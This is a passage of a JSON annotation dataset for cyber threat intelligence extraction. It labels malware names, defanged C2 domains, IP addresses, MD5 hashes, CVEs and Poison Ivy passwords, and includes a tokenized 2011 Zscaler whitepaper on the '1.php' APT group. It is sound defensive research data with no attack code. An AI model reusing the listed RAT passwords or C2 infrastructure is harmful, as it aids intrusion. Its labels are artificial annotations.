["T75", "Address", "5848", "5861", "74", ".", "126.177.68"], ["T76", "Address", "5862", "5876", "192", ".", "74.246.219"], ["T77", "Address", "5877", "5891", "192", ".", "74.246.219"], ["T78", "Address", "5892", "5907", "103", ".", "246.246.103"], ["T79", "Indicator", "5910", "5929", "updatedns", ".", "ns02[.]us"], ["T80", "Time", "5930", "5940", "2013-09-06"], ["T81", "Indicator", "5941", "5960", "updatedns", ".", "ns01[.]us"], ["T82", "Time", "5961", "5971", "2013-09-06"], ["T83", "Indicator", "5972", "5985", "wmi", ".", "ns01[.]us"], ["T84", "Time", "5986", "5996", "2013-07-04"], ["T85", "Time", "5998", "6008", "2013-09-06"], ["T86", "Time", "6009", "6019", "2013-09-06"], ["T87", "Time", "6020", "6030", "2013-07-15"], ["T88", "Address", "6032", "6047", "103", ".", "246.246.103"], ["T89", "Address", "6048", "6063", "103", ".", "246.246.103"], ["T90", "Address", "6064", "6079", "103", ".", "246.246.103"], ["T91", "Indicator", "6172", "6185", "wmi", ".", "ns01[.]us"], ["T92", "MD5", "6226", "6258", "7995a9a6a889b914e208eb924e459ebc"], ["T93", "MD5", "6298", "6330", "bf60b8d26bc0c94dda2e3471de6ec977"], ["T94", "MD5", "6371", "6403", "fd69793bd63c44bbb22f9c4d46873252"], ["T95", "Malware", "6259", "6264", "PlugX"], ["T96", "Malware", "6331", "6336", "PlugX"], ["T97", "Malware", "6404", "6410", "Poison"], ["T98", "Malware", "6463", "6469", "Poison"], ["T99", "Malware", "6522", "6528", "Poison"], ["T100", "Indicator", "6276", "6297", "fuckchina", ".", "govnb[.]com"], ["T101", "Indicator", "6348", "6370", "microsafes", ".", "no-ip[.]org"], ["T102", "Time", "6337", "6347", "2010-03-15"], ["T103", "Time", "6265", "6275", "2012-06-09"], ["T104", "Time", "6411", "6421", "2013-03-07"], ["T105", "Time", "6470", "6480", "2012-06-11"], ["T106", "Time", "6529", "6539", "2012-06-11"], ["T107", "Indicator", "6587", "6608", "fuckchina", ".", "govnb[.]com"], ["T108", "Time", "6609", "6619", "2013-12-11"], ["T109", "Time", "6620", "6630", "2013-12-11"], ["T110", "Address", "6631", "6646", "204", ".", "200.222.136"], ["T111", "Time", "6670", "6680", "2014-02-12"], ["T112", "Indicator", "6647", "6669", "microsafes", ".", "no-ip[.]org"], ["T113", "Time", "6681", "6691", "2014-02-12"], ["T114", "Address", "6692", "6705", "74", ".", "126.177.70"], ["T115", "Indicator", "6706", "6728", "microsafes", ".", "no-ip[.]org"], ["T116", "Time", "6729", "6739", "2013-12-04"], ["T117", "Time", "6740", "6750", "2013-12-04"], ["T118", "Address", "6751", "6765", "74", ".", "126.177.241"], ["T119", "Malware", "6771", "6781", "Poison", "Ivy"], ["T120", "Indicator", "6813", "6833", "domain", "wmi", ".", "ns01[.]us"], ["R26", "indicates", "Arg1:T120", "Arg2:T119"], ["T121", "MD5", "6430", "6462", "88b375e3b5c50a3e6c881bc96c926928"], ["T122", "MD5", "6489", "6521", "cd07a9e49b1f909e1bd9e39a7a6e56b4"], ["R27", "indicates", "Arg1:T121", "Arg2:T98"], ["R28", "hasAttackTime", "Arg1:T98", "Arg2:T105"], ["R29", "hasAttackTime", "Arg1:T97", "Arg2:T104"], ["R30", "indicates", "Arg1:T94", "Arg2:T97"], ["R31", "indicates", "Arg1:T122", "Arg2:T99"], ["R32", "hasAttackTime", "Arg1:T99", "Arg2:T106"], ["R33", "indicates", "Arg1:T92", "Arg2:T95"], ["R34", "hasAttackTime", "Arg1:T95", "Arg2:T103"], ["R35", "indicates", "Arg1:T100", "Arg2:T95"], ["R36", "indicates", "Arg1:T93", "Arg2:T96"], ["R37", "indicates", "Arg1:T101", "Arg2:T96"], ["R38", "hasAttackTime", "Arg1:T96", "Arg2:T102"], ["T123", "MD5", "6898", "6930", "fd69793bd63c44bbb22f9c4d46873252"], ["T124", "MD5", "6937", "6969", "88b375e3b5c50a3e6c881bc96c926928"], ["T125", "MD5", "6976", "7008", "cd07a9e49b1f909e1bd9e39a7a6e56b4"], ["T126", "Password", "6931", "6936", "java7"], ["T127", "Password", "6970", "6975", "admin"], ["T128", "Password", "7009", "7014", "admin"], ["R39", "indicates", "Arg1:T123", "Arg2:T119"], ["R40", "indicates", "Arg1:T124", "Arg2:T119"], ["R41", "indicates", "Arg1:T125", "Arg2:T119"], ["T129", "MD5", "7095", "7127", "8936c87a08ffa56d19fdb87588e35952"], ["T130", "Malware", "7072", "7082", "Poison", "Ivy"], ["R42", "indicates", "Arg1:T129", "Arg2:T130"], ["T131", "Password", "7144", "7149", "java7"], ["T132", "Software", "7185", "7196", "Adobe", "Flash"], ["T133", "Vulnerability", "7206", "7219", "CVE-2012-0779"], ["R43", "hasVulnerability", "Arg1:T132", "Arg2:T133"], ["R44", "exploits", "Arg1:T130", "Arg2:T133"], ["T134", "ExploitTargetObject", "7265", "7295", "Center", "for", "Defense", "Information"], ["T135", "ExploitTargetObject", "7305", "7318", "www", ".", "cdi[.]org"], ["T136", "Address", "7412", "7424", "159", ".", "54.62.92"], ["T137", "File", "7480", "7495", "BrightBalls", ".", "swf"], ["T138", "MD5", "7527", "7528", "1"], ["R45", "indicates", "Arg1:T137", "Arg2:T130"], ["R46", "indicates", "Arg1:T138", "Arg2:T130"], ["T139", "Malware", "7571", "7581", "Poison", "Ivy"], ["T140", "Password", "7631", "7636", "java7"], ["T141", "Indicator", "7711", "7720", "YFds*&^ff"], ["T142", "Indicator", "7755", "7772", "windows", ".", "ddns[.]us"], ["T143", "Indicator", "7821", "7838", "windows", ".", "ddns[.]us"], ["T144", "Indicator", "7843", "7856", "wmi", ".", "ns01[.]us"], ["T145", "Address", "7874", "7886", "76", ".", "73.80.188"], ["T146", "Time", "7890", "7898", "mid-2012"], ["R47", "indicates", "Arg1:T141", "Arg2:T139"], ["R48", "indicates", "Arg1:T142", "Arg2:T139"], ["R49", "indicates", "Arg1:T143", "Arg2:T139"], ["R50", "indicates", "Arg1:T144", "Arg2:T139"], ["R51", "hasAttackTime", "Arg1:T139", "Arg2:T146"], ["R52", "usesAddress", "Arg1:T139", "Arg2:T145"], ["T147", "Indicator", "7907", "7918", "wmi", ".", "ns01.us"], ["T148", "Indicator", "7919", "7934", "windows", ".", "ddns.us"], ["T149", "Time", "7947", "7957", "2012-07-07"], ["T150", "Time", "7958", "7968", "2012-05-23"], ["T151", "Time", "7980", "7990", "2012-09-19"], ["T152", "Time", "7991", "8001", "2012-06-10"], ["T153", "Address", "8014", "8026", "76", ".", "73.80.188"], ["T154", "MD5", "8166", "8198", "7d810e3564c4eb95bcb3d11ce191208e"], ["T155", "Vulnerability", "8225", "8238", "CVE-2012-0507"], ["T156", "MD5", "8291", "8323", "52aa791a524b61b129344f10b4712f52"], ["T157", "Malware", "8253", "8263", "Poison", "Ivy"], ["R53", "exploits", "Arg1:T157", "Arg2:T155"], ["R54", "indicates", "Arg1:T154", "Arg2:T157"], ["R55", "indicates", "Arg1:T156", "Arg2:T157"], ["T158", "Malware", "8331", "8341", "Poison", "Ivy"], ["T159", "Indicator", "8379", "8392", "ids", ".", "ns01[.]us"], ["T160", "Indicator", "8405", "8418", "ids", ".", "ns01[.]us"], ["R56", "indicates", "Arg1:T160", "Arg2:T158"], ["R57", "indicates", "Arg1:T159", "Arg2:T158"], ["T161", "Indicator", "8449", "8462", "wmi", ".", "ns01[.]us"], ["T162", "Address", "8473", "8487", "194", ".", "183.224.75"], ["T163", "Indicator", "8496", "8509", "wmi", ".", "ns01[.]us"], ["T164", "Indicator", "8510", "8523", "ids", ".", "ns01[.]us"], ["T165", "Time", "8536", "8546", "2012-07-03"], ["T166", "Time", "8547", "8557", "2012-04-23"], ["T167", "Time", "8569", "8579", "2012-07-04"], ["T168", "Time", "8580", "8590", "2012-05-18"], ["T169", "Address", "8603", "8617", "194", ".", "183.224.75"], ["T170", "Address", "8618", "8632", "194", ".", "183.224.75"], ["T171", "MD5", "8678", "8710", "fd69793bd63c44bbb22f9c4d46873252"], ["T172", "ExploitTargetObject", "8783", "8817", "Center", "for", "European", "Policy", "Studies"], ["T173", "Malware", "8638", "8648", "Poison", "Ivy"], ["T174", "ExploitTargetObject", "8819", "8832", "www", ".", "ceps[.]be"], ["T175", "ExploitTargetObject", "8879", "8892", "www", ".", "ceps[.]be"], ["T176", "Indicator", "8921", "8939", "shop", ".", "fujifilm[.]be"], ["R58", "indicates", "Arg1:T176", "Arg2:T173"], ["R59", "indicates", "Arg1:T171", "Arg2:T173"], ["T177", "ExploitTargetObject", "8998", "9012", "www", ".", "arce[.]org"], ["R60", "usesAddress", "Arg1:T95", "Arg2:T110"], ["R61", "usesAddress", "Arg1:T95", "Arg2:T114"], ["R62", "usesAddress", "Arg1:T96", "Arg2:T118"]]}], [{"vertexSet": [{"old_id": "T1", "type": "AttackerGroup", "name": "1php", "sent_id": 7, "pos": []}, {"old_id": "T2", "type": "Exploit", "name": "spear-phishing emails", "sent_id": 8, "pos": [8, 9]}, {"old_id": "T3", "type": "Exploit", "name": "malicious PDF attachments", "sent_id": 9, "pos": [1, 3]}, {"old_id": "T4", "type": "Exploit", "name": "web links to binary executables", "sent_id": 9, "pos": [5, 9]}, {"old_id": "T5", "type": "Malware", "name": "Poison Ivy", "sent_id": 10, "pos": [2, 3]}, {"old_id": "T6", "type": "Country", "name": "China", "sent_id": 11, "pos": []}, {"old_id": "T7", "type": "Country", "name": "US", "sent_id": 11, "pos": []}, {"old_id": "T8", "type": "ExploitTargetObject", "name": "Defense entities", "sent_id": 12, "pos": [0, 1]}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "Geospatial industry", "sent_id": 12, "pos": [5, 6]}, {"old_id": "T10", "type": "Organization", "name": "Zscaler", "sent_id": 12, "pos": [8]}, {"old_id": "T11", "type": "Software", "name": "ThreatlabZ", "sent_id": 52, "pos": [5]}, {"old_id": "T12", "type": "Organization", "name": "Zscaler", "sent_id": 52, "pos": [4]}, {"old_id": "T13", "type": "Time", "name": "2009", "sent_id": 124, "pos": [10]}, {"old_id": "T14", "type": "Attacker", "name": "1php", "sent_id": 122, "pos": []}, {"old_id": "T15", "type": "File", "name": "WWWDREAMLIFESNET/Afghanistan/Afghanistanzip", "sent_id": 139, "pos": []}, {"old_id": "T16", "type": "MD5", "name": "052E62513505A25CCFADF900A052709C", "sent_id": 140, "pos": [1]}, {"old_id": "T17", "type": "Malware", "name": "Poison Ivy RAT", "sent_id": 142, "pos": [6, 8]}, {"old_id": "T18", "type": "Vulnerability", "name": "CVE-2009-4324", "sent_id": 145, "pos": [3]}, {"old_id": "T19", "type": "File", "name": "SUCHOSTEXE", "sent_id": 151, "pos": []}, {"old_id": "T20", "type": "File", "name": "Requestpdf", "sent_id": 151, "pos": []}, {"old_id": "T21", "type": "MD5", "name": "B0EECA383A7477EE689EC807B775EBBB", "sent_id": 152, "pos": [1]}, {"old_id": "T22", "type": "Malware", "name": "Poison Ivy RAT", "sent_id": 149, "pos": [6, 8]}, {"old_id": "T23", "type": "Indicator", "name": "CECONFLOWER-SHOWORG", "sent_id": 158, "pos": []}, {"old_id": "T24", "type": "Time", "name": "July 2011", "sent_id": 159, "pos": [4, 5]}, {"old_id": "T25", "type": "Attacker", "name": "1php", "sent_id": 157, "pos": []}, {"old_id": "T26", "type": "Country", "name": "Japan", "sent_id": 162, "pos": [4]}, {"old_id": "T27", "type": "Country", "name": "China", "sent_id": 162, "pos": [6]}, {"old_id": "T28", "type": "Country", "name": "Taiwan", "sent_id": 162, "pos": [8]}, {"old_id": "T29", "type": "Country", "name": "USA", "sent_id": 162, "pos": [10]}, {"old_id": "T30", "type": "Vulnerability", "name": "CVE-2010-2883", "sent_id": 165, "pos": [7]}, {"old_id": "T31", "type": "Vulnerability", "name": "CVE-2010-2883", "sent_id": 161, "pos": []}, {"old_id": "T32", "type": "Malware", "name": "Poison Ivy", "sent_id": 166, "pos": [2, 3]}, {"old_id": "T33", "type": "File", "name": "Halloweenscr", "sent_id": 170, "pos": []}, {"old_id": "T34", "type": "MD5", "name": "5B90896127179F0AD2E6628593CDB60D", "sent_id": 171, "pos": [1]}, {"old_id": "T35", "type": "Vulnerability", "name": "CVE-2010-2883", "sent_id": 164, "pos": [2]}, {"old_id": "T36", "type": "Indicator", "name": "FREECOFFEELAUCHCOM", "sent_id": 178, "pos": []}, {"old_id": "T37", "type": "Address", "name": "98126693", "sent_id": 178, "pos": []}, {"old_id": "T38", "type": "Indicator", "name": "FIREHAPPYSYTESNET", "sent_id": 179, "pos": []}, {"old_id": "T39", "type": "Address", "name": "98126693", "sent_id": 179, "pos": []}, {"old_id": "T40", "type": "MalwareCharacteristics", "name": "base64 encoded", "sent_id": 187, "pos": [2, 3]}, {"old_id": "T41", "type": "MalwareCharacteristics", "name": "0x3C", "sent_id": 187, "pos": [11]}, {"old_id": "T42", "type": "MalwareCharacteristics", "name": "0x3E", "sent_id": 188, "pos": [1]}, {"old_id": "T43", "type": "TrojanHorse", "name": "Win32Buzuscvdu7", "sent_id": 212, "pos": []}, {"old_id": "T44", "type": "TrojanHorse", "name": "TrojanWin32Agent eevf8", "sent_id": 212, "pos": []}, {"old_id": "T45", "type": "Indicator", "name": "FQDN/cssashxsc=[data1]&sp=[data2]&ad=[data3]&dh=[data4]&mr=[d ata5]&tk=", "sent_id": 251, "pos": []}, {"old_id": "T46", "type": "Indicator", "name": "HOUSESUPERDOGDREAMCOM", "sent_id": 263, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "HOMEALLMYDEARFRIENDSCOM", "sent_id": 264, "pos": []}, {"old_id": "T48", "type": "Indicator", "name": "GOOGLETIMESERVEIRCCOM", "sent_id": 265, "pos": []}, {"old_id": "T49", "type": "Indicator", "name": "INFOSPORTGAMEINFOCOM", "sent_id": 266, "pos": []}, {"old_id": "T50", "type": "Indicator", "name": "PEOPLEENJOYHOLIDAYSNET", "sent_id": 267, "pos": []}, {"old_id": "T51", "type": "Indicator", "name": "PEARHOSTSERVEHALFLIFECOM", "sent_id": 268, "pos": []}, {"old_id": "T52", "type": "Indicator", "name": "FQDN/[data1]/[data2]/[data3]/[data4]/[data5]", "sent_id": 275, "pos": [0]}, {"old_id": "T53", "type": "Indicator", "name": "SATELLITEQUICKSEARCHMOVIECOM", "sent_id": 287, "pos": []}, {"old_id": "T54", "type": "Indicator", "name": "WWWTOYHOPINGCOM", "sent_id": 288, "pos": []}, {"old_id": "T55", "type": "Indicator", "name": "WORKFREETHROWLINENET", "sent_id": 289, "pos": []}, {"old_id": "T56", "type": "Indicator", "name": "SEAANIMALFANSNET", "sent_id": 290, "pos": []}, {"old_id": "T57", "type": "Indicator", "name": "WWWSEARCHSEANET", "sent_id": 291, "pos": []}, {"old_id": "T58", "type": "Indicator", "name": "LOVEANIMALFANSNET", "sent_id": 292, "pos": []}, {"old_id": "T59", "type": "Indicator", "name": "WWWJOBCALLORG", "sent_id": 293, "pos": []}, {"old_id": "T60", "type": "Time", "name": "August 3 2011", "sent_id": 308, "pos": [2, 5]}, {"old_id": "T61", "type": "Attacker", "name": "1php", "sent_id": 301, "pos": []}, {"old_id": "T62", "type": "AttackerGroup", "name": "1php", "sent_id": 272, "pos": []}, {"old_id": "T63", "type": "Indicator", "name": "WWWSAVAGECOUNTYNET", "sent_id": 336, "pos": []}, {"old_id": "T64", "type": "Indicator", "name": "LOOKCAPTAINSABERTOOTHNET", "sent_id": 337, "pos": []}, {"old_id": "T65", "type": "Indicator", "name": "GEOINFOSERVEHTTPCOM", "sent_id": 338, "pos": []}, {"old_id": "T66", "type": "Indicator", "name": "ROSEOFFICESKYLINECOM", "sent_id": 339, "pos": []}, {"old_id": "T67", "type": "Indicator", "name": "WWWCAREERCHALLENGESNET", "sent_id": 340, "pos": []}, {"old_id": "T68", "type": "Indicator", "name": "OFFERAMERICAMSN", "sent_id": 341, "pos": []}, {"old_id": "T69", "type": "Indicator", "name": "firehappysytesnet", "sent_id": 358, "pos": []}, {"old_id": "T70", "type": "Host", "name": "free", "sent_id": 363, "pos": [0]}, {"old_id": "T71", "type": "Host", "name": "image", "sent_id": 364, "pos": [0]}, {"old_id": "T72", "type": "Host", "name": "tastfine", "sent_id": 367, "pos": [0]}, {"old_id": "T73", "type": "Host", "name": "house", "sent_id": 372, "pos": [0]}, {"old_id": "T74", "type": "Host", "name": "do:", "sent_id": 374, "pos": [0]}, {"old_id": "T75", "type": "Host", "name": "dream", "sent_id": 381, "pos": [0]}, {"old_id": "T76", "type": "Host", "name": "smart", "sent_id": 382, "pos": [0]}, {"old_id": "T77", "type": "Host", "name": "rose", "sent_id": 384, "pos": [0]}, {"old_id": "T78", "type": "Host", "name": "qinetiq", "sent_id": 388, "pos": [0]}, {"old_id": "T79", "type": "Host", "name": "qnao", "sent_id": 390, "pos": [0]}, {"old_id": "T80", "type": "Host", "name": "look", "sent_id": 394, "pos": [0]}, {"old_id": "T81", "type": "Host", "name": "www", "sent_id": 397, "pos": [0]}, {"old_id": "T82", "type": "Address", "name": "98126693", "sent_id": 365, "pos": []}, {"old_id": "T83", "type": "Indicator", "name": "dreamlifesnet", "sent_id": 366, "pos": []}, {"old_id": "T84", "type": "Indicator", "name": "seablownet", "sent_id": 370, "pos": []}, {"old_id": "T85", "type": "Indicator", "name": "superdogdreamcom", "sent_id": 371, "pos": []}, {"old_id": "T86", "type": "Indicator", "name": "allmydearfriendscom", "sent_id": 373, "pos": []}, {"old_id": "T87", "type": "Indicator", "name": "sportgameinfocom", "sent_id": 376, "pos": []}, {"old_id": "T88", "type": "Indicator", "name": "enjoyholidaysnet", "sent_id": 377, "pos": []}, {"old_id": "T89", "type": "Indicator", "name": "jobcallorg", "sent_id": 379, "pos": []}, {"old_id": "T90", "type": "Indicator", "name": "geoinfoservehttpcom", "sent_id": 380, "pos": []}, {"old_id": "T91", "type": "Address", "name": "17863130197", "sent_id": 383, "pos": []}, {"old_id": "T92", "type": "Address", "name": "464209130", "sent_id": 386, "pos": []}, {"old_id": "T93", "type": "Indicator", "name": "officeskylinecom", "sent_id": 387, "pos": []}, {"old_id": "T94", "type": "Indicator", "name": "captainsabertoothnet", "sent_id": 389, "pos": []}, {"old_id": "T95", "type": "Indicator", "name": "savagecountynet", "sent_id": 391, "pos": []}, {"old_id": "T96", "type": "Indicator", "name": "bakerhughesthrutherenet9", "sent_id": 402, "pos": []}, {"old_id": "T97", "type": "ExploitTargetObject", "name": "US Government", "sent_id": 406, "pos": [3, 4]}, {"old_id": "T98", "type": "ExploitTargetObject", "name": "Defense Industrial Base", "sent_id": 406, "pos": [7, 9]}, {"old_id": "T99", "type": "Attacker", "name": "1php", "sent_id": 404, "pos": []}, {"old_id": "T100", "type": "Software", "name": "IE 6", "sent_id": 472, "pos": [1, 2]}, {"old_id": "T101", "type": "Organization", "name": "Microsoft", "sent_id": 472, "pos": [0]}, {"old_id": "T102", "type": "AttackerGroup", "name": "Soysauce", "sent_id": 428, "pos": []}, {"old_id": "T103", "type": "AttackerGroup", "name": "Comment Crew", "sent_id": 429, "pos": []}, {"old_id": "T104", "type": "AttackerGroup", "name": "GIF89a", "sent_id": 429, "pos": []}, {"old_id": "T105", "type": "Exploit", "name": "steganography", "sent_id": 436, "pos": [6]}], "labels": [{"old_id": "R1", "r": "P3", "h": 4, "t": 0, "evidence": []}, {"old_id": "R2", "r": "P32", "h": 4, "t": 5, "evidence": [10, 11]}, {"old_id": "R3", "r": "P32", "h": 4, "t": 6, "evidence": [10, 11]}, {"old_id": "R4", "r": "P17", "h": 11, "t": 10, "evidence": [52]}, {"old_id": "R5", "r": "P33", "h": 13, "t": 12, "evidence": [122, 123, 124]}, {"old_id": "R6", "r": "P21", "h": 14, "t": 16, "evidence": [139, 140, 141, 142]}, {"old_id": "R7", "r": "P21", "h": 15, "t": 16, "evidence": [140, 141, 142]}, {"old_id": "R8", "r": "P7", "h": 16, "t": 17, "evidence": [142, 143, 144, 145]}, {"old_id": "R9", "r": "P21", "h": 18, "t": 21, "evidence": []}, {"old_id": "R10", "r": "P21", "h": 20, "t": 21, "evidence": []}, {"old_id": "R11", "r": "P21", "h": 19, "t": 21, "evidence": []}, {"old_id": "R12", "r": "P33", "h": 24, "t": 23, "evidence": [157, 158, 159]}, {"old_id": "R13", "r": "P21", "h": 22, "t": 21, "evidence": []}, {"old_id": "R14", "r": "P32", "h": 24, "t": 25, "evidence": [157, 158, 159, 160, 161, 162]}, {"old_id": "R15", "r": "P32", "h": 24, "t": 26, "evidence": [157, 158, 159, 160, 161, 162]}, {"old_id": "R16", "r": "P32", "h": 24, "t": 27, "evidence": [157, 158, 159, 160, 161, 162]}, {"old_id": "R17", "r": "P32", "h": 24, "t": 28, "evidence": [157, 158, 159, 160, 161, 162]}, {"old_id": "R18", "r": "P7", "h": 31, "t": 30, "evidence": []}, {"old_id": "R19", "r": "P7", "h": 31, "t": 29, "evidence": []}, {"old_id": "R20", "r": "P7", "h": 31, "t": 34, "evidence": []}, {"old_id": "R21", "r": "P21", "h": 32, "t": 31, "evidence": []}, {"old_id": "R22", "r": "P21", "h": 33, "t": 31, "evidence": []}, {"old_id": "R23", "r": "P33", "h": 60, "t": 59, "evidence": [301, 302, 303, 304, 305, 306, 307, 308]}, {"old_id": "R24", "r": "P17", "h": 100, "t": 99, "evidence": [472]}], "title": ["inputs/txt/201110Zscaler1php"], "sents": [["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Whitepaper:"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "1"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["The", "following", "release", "statement", "provides", "a", "brief", "summary", "of"], ["information", "related", "to", "the", "\u201c1", ".", "php\u201d", "Group", "dating", "from", "2008", "to"], ["present", ".", "This", "Group\u2019s", "methods", "tend", "to", "be", "spear-phishing", "emails"], ["with", "malicious", "PDF", "attachments", "or", "web", "links", "to", "binary", "executables"], ["with", "a", "Poison", "Ivy", "remote", "administration", "tool", "(RAT)", "payload", ".", "The"], ["Group\u2019s", "targeted", "victims", "included", "China/US", "relations", "experts", ","], ["Defense", "entities", ",", "and", "the", "Geospatial", "industry", ".", "Zscaler", "detected"], ["repeated", "infections", "from", "this", "Group", "to", "a", "customer", "related", "to", "this"], ["target", "list", ".", "The", "following", "report", "summarizes", "the", "incident", "details", "to"], ["\u201c"], ["This", "Group\u2019s"], ["methods", "tend", "to"], ["be", "spear-phishing"], ["emails", "with", "malicious"], ["PDF", "attachments", "or"], ["web", "links", "to", "binary"], ["executables", "with", "a"], ["(RAT)", "payload", "."], ["\u201c"], ["Summary"], ["increase", "awareness", "of", "these", "attacks", "in", "order", "to", "increase", "detection", ","], ["-Zscaler", "ThreatLabZ"], ["response", ",", "and", "prevention", ".", "A", "much", "more", "detailed", "report", "has", "been"], ["provided", "to", "impacted", "parties", ",", "stakeholders", ",", "and", "other", "trusted"], ["groups", "dealing", "with", "these", "incidents", ".", "The", "larger", "report", "dives", "into"], ["more", "details", "about", "the", "command", "and", "control", "servers", "(C&Cs)"], ["would", "like", "to", "collaborate", ",", "please", "contact", "threatlabz@zscaler", ".", "com"], ["and", "we", "will", "share", "the", "detailed", "report", "with", "select", "entities", "."], ["Introduction"], ["Zscaler", "provides", "inline", "security", "and", "policy", "enforcement", "of", "web"], ["and", "email", "transactions", "to", "include", "full-content", "inspection", "and"], ["comprehensive", "transaction", "logging", "and", "analysis", ".", "Given", "that"], ["many", "of", "Zscaler\u2019s", "customers", "are", "large", "enterprises", ",", "it", "is", "not"], ["surprising", "that", "some", "have", "been", "the", "target", "of", "so", "called", "Advanced"], ["\u201c"], ["The", "Group\u2019s"], ["targeted", "victims"], ["included", "China/US"], ["relations", "experts", ","], ["Defense", "entities", ","], ["and", "the", "Geospatial"], ["industry", "."], ["\u201c"], ["being", "used", "by", "this", "Group", ".", "If", "you", "are", "working", "on", "similar", "research"], ["-Zscaler", "ThreatLabZ"], ["Persistent", "Threats", "(APTs)", ".", "During", "the", "course", "of", "our", "daily", "activities"], ["researching", "various", "threats", ",", "Zscaler", "ThreatlabZ", "often", "uncovers"], ["infected", "hosts", "that", "we", "believe", "have", "been", "compromised", "via"], ["attacks", "that", "bear", "the", "signature", "of", "an", "APT", "attack", ".", "While", "there", "is", "no"], ["universally", "accepted", "definition", "of", "APT", "attacks", ",", "for", "the", "purposes"], ["of", "this", "paper", "we", "will", "leverage", "Richard", "Bejtlich\u2019s", "blog", "post", "on", "the"], ["subject1", "."], ["1", ".", "http://taosecurity", ".", "blogspot.com/2010/01/what-is-apt-and-what-does-it-want.html"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "2"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["of", "computer", "intrusion", ".", "They", "can", "use", "the", "most", "pedestrian"], ["publicly", "available", "exploit", "against", "a", "well-known", "vulnerability", ",", "or"], ["they", "can", "elevate", "their", "game", "to", "research", "new", "vulnerabilities", "and"], ["develop", "custom", "exploits", ",", "depending", "on", "the", "target\u2019s", "posture", "."], ["\u2022", "Persistent", "means", "the", "adversary", "is", "formally", "tasked", "to"], ["accomplish", "a", "mission", ".", "They", "are", "not", "opportunistic", "intruders", ".", "Like"], ["an", "intelligence", "unit", "they", "receive", "directives", "and", "work", "to", "satisfy"], ["their", "masters", ".", "Persistent", "does", "not", "necessarily", "mean", "they", "need"], ["to", "constantly", "execute", "malicious", "code", "on", "victim", "computers", "."], ["Rather", ",", "they", "maintain", "the", "level", "of", "interaction", "needed", "to", "execute"], ["their", "objectives", "."], ["\u2022", "Threat", "means", "the", "adversary", "is", "not", "a", "piece", "of", "mindless", "code", "."], ["This", "point", "is", "crucial", ".", "Some", "people", "throw", "around", "the", "term"], ["\u201cthreat\u201d", "with", "reference", "to", "malware", ".", "If", "malware", "had", "no", "human"], ["\u201c"], ["\u2026the", "adversary"], ["here", "is", "a", "threat"], ["because", "it", "is", "organized"], ["and", "funded", "and"], ["motivated", ".", "Some"], ["people", "speak", "of"], ["multiple", "\u201cgroups\u201d"], ["consisting", "of"], ["dedicated", "\u201ccrews\u201d"], ["with", "various", "missions", "."], ["\u201c"], ["\u2022", "Advanced", "means", "the", "adversary", "can", "operate", "in", "the", "full", "spectrum"], ["-Richard", "Bejtlich", ","], ["TaoSecurity", "blog"], ["attached", "to", "it", "(someone", "to", "control", "the", "victim", ",", "read", "the", "stolen"], ["data", ",", "etc", ".", "),", "then", "most", "malware", "would", "be", "of", "little", "worry", "(as", "long"], ["as", "it", "didn\u2019t", "degrade", "or", "deny", "data)", ".", "Rather", ",", "the", "adversary", "here"], ["is", "a", "threat", "because", "it", "is", "organized", "and", "funded", "and", "motivated", "."], ["Some", "people", "speak", "of", "multiple", "\u201cgroups\u201d", "consisting", "of"], ["dedicated", "\u201ccrews\u201d", "with", "various", "missions", "."], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "3"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Contents"], ["Summary", ".", "......................................................................................................................", "1"], ["Introduction", ".", "...................................................................................................................", "1"], ["Section", "1:", "\u201c1", ".", "php\u201d", "Group", "Open-Source", "Intelligence", "(OSINT)", ".", ".........................................", "5"], ["Section", "2:", "Customer", "Infection", "Behavior", ".", "........................................................................", "8"], ["2", ".", "1", "GET", "Beacons", "with", "Modified", "XOR", "Parameters", ".", "........................................................", "8"], ["2", ".", "2", "GET", "Beacons", "with", "Data", "moved", "to", "URL", "path", ".", "...........................................................", "9"], ["2", ".", "3", "HTTPS", "CONNECTs", "to", "C&Cs", ".", "...................................................................................", "9"], ["Section", "3:", "Indent", "Inter-Relationships", ".", "............................................................................", "10"], ["3", ".", "1", "Possible", "Relationship", "to", "Other", "APT", "Incidents", ".", ".........................................................", "12"], ["Section", "4:", "Lessons", "Learned", ".", "..........................................................................................", "13"], ["4", ".", "1", "Conduct", "logging", "and", "analytics", "within", "your", "environment", ".", ".........................................", "13"], ["4", ".", "2", "Correlate", "with", "other", "sources", ".", "..................................................................................", "14"], ["4", ".", "3", "APTs", "are", "not", "always", "that", "\u2018Advanced", ".", ".......................................................................", "14"], ["4", ".", "4", "APTs", "are", "not", "limited", "to", "the", "United", "States", "Government", "or", "Defense", "Industrial", "Base", ".", "...", "14"], ["4", ".", "5", "APT", "Information", "Disclosure", "Remains", "a", "Challenge", ".", "..................................................", "15"], ["Conclusion", ".", "....................................................................................................................", "16"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "4"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["\u201c1", ".", "php\u201d", "Group", "Open-Source", "Intelligence", "(OSINT)"], ["There", "is", "a", "good", "deal", "of", "information", "in", "the", "public", "domain", "related", "to"], ["\u201c1", ".", "php\u201d", "Group", "incidents", "(malware", "and", "C&Cs)", "that", "can", "be", "correlated", "with"], ["incident", "activity", "that", "we", "identify", "and", "detail", "within", "this", "report", ".", "Intrusion"], ["activities", "related", "to", "this", "Group", "date", "back", "at", "least", "to", "2009", ",", "if", "not", "earlier"], ["(there", "is", "one", "sample", "we", "found", "dating", "back", "to", "2008)", ".", "For", "example", ",", "a"], ["December", "7", ",", "2009", "blog", "post", "by", "Contagio2", "details", "a", "malicious", "phishing"], ["email", "regarding", "United", "States", "troop", "deployment", "in", "Afghanistan", "that"], ["\u201c"], ["Once", "unzipped", ","], ["the", "malware", "is", "a"], ["Windows", "executable"], ["with", "an", "SCR", "extension"], ["that", "is", "identified", "as", 